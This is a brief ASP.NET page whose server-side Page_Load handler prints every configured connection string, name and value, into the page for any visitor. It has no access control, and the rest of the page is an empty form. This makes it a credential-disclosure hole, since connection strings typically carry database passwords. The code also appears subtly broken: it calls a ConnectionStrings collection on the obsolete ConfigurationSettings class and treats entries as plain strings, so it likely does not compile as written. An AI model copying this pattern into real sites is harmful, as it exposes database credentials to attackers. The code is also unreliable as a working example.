 <%@ page language="C#" %>
 <%@ import namespace="System.Web.Management" %>

<script runat="server">
    
    void Page_Load(object sender, System.EventArgs e)
    {
        foreach(string key in ConfigurationSettings.ConnectionStrings) {
            this.Response.Write(string.Format("<p><b>{0}</b> = {1}</p>", key, ConfigurationSettings.ConnectionStrings[key]));
        }
    }
    
</script>

<html>
<head id="Head1" runat="server">
    <title>Untitled Page</title>
</head>
    
<body>
    <form id="Form1" runat="server">
    </form>
</body>
</html>
